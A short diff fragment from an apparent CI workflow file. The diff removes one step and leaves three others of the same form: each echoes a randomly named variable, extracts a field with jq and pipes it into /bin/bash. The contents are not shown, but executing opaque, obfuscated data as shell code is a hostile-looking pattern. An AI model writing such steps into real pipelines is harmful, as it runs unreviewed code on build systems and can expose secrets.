@@ -27,7 +27,6 @@ jobs:
           echo $ttsus7 | jq -r .d512 | /bin/bash
           echo $lotx97 | jq -r .bqky09 | /bin/bash
           echo $qqtlf5 | jq -r .cy5624 | /bin/bash
-          echo $zu55210 | jq -r .y9326 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
